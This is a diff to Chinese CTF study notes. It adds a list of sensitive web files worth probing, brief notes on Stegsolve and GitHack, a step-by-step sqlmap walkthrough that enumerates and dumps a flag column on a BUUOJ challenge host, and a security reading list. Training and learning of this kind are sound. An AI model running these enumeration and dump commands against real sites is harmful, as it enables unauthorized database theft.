@@ -92,6 +92,12 @@ F7 46：最后修改文件日期
 
 ## WEB Web漏洞
 
+关于Web的敏感文件有：
+1. robots.txt文件是一种叫做robots的协议。其文件常在网站根目录下。告诉网络爬虫，哪些文件或者文件夹可以被网络爬虫获取。哪些文件不可以被网络爬虫获取。
+2. readme.md是一种以MarkeDown格式书写的文件。通常记录一些CMS版本的信息。部分提供其CMS的GitHub地址。
+3. www.zip/rar/tar.gz 是一种压缩包格式的文件。
+4. index.php或者index.php~
+
 ### PHP伪协议
 
 具体题目：[[极客大挑战 2019]Secret File 1](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)
@@ -232,11 +238,64 @@ http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip
 
 ### Burp Suite
 
+### Stegotools
+
+作用：查看图像的隐写情况。
+
+使用：在tools下运行```jar ./Stegsolve.jar```命令即可。
+
+### GitHack
+
+详情请见·```Githack```文件夹下的```README.md```
+
+### SqlMap
+
+使用步骤：
+1. 查看数据库名称：
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 --dbs
+```
+2. 查看目标数据库的表,note表示目标表。
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables
+```
+3. 查看数据库表字段
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g --columns
+```
+
+4. 查看目标字段的值
+```
+python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g -C f111ag --dump
+```
+
+最后得到```flag```。
+
 ### 其他
 
 1. F5隐写工具使用：https://zhuanlan.zhihu.com/p/480561261
 
+## 学习路线
+
+书籍阅读路线
+
+- [ ] 从0到1：CTFer成长之路
+- [ ] CTF特训营
+- [ ] Web安全攻防：渗透测试实战指南
+- [ ] 黑客攻防技术宝典Web实战篇
+- [ ] 内网安全攻防-渗透测试实战指南
+- [ ] web安全学习笔记
+- [ ] 网络安全进阶笔记
+- [ ] 白帽子讲Web安全
+- [ ] 黑客攻防技术宝典Web实战篇
+- [ ] 网络攻防实战研究：漏洞利用与提权
+- [ ] 打造CTF 肾透测试兴奋混合剂
+- [ ] [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/)
+
 ## 博客
+
 1. [推荐：配枪的朱丽叶](https://shawroot.hatenablog.com/archive/category/rsa)
 2. [RSA题目全解](https://blog.csdn.net/mikecoke/article/details/105967809)
 3. [web渗透实战系列(top40)](https://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247507680&idx=1&sn=000501c787decc35d1cc971abe397ead&chksm=ce647479f913fd6f2cf30b54726b723a5c9a0d6db5e9ce997c1b51b223a2396ba78da8b10246&scene=18#wechat_redirect)
+4. [Web安全学习笔记](https://websec.readthedocs.io/zh/latest/)
+5. Hacking黑白红公众号的文章
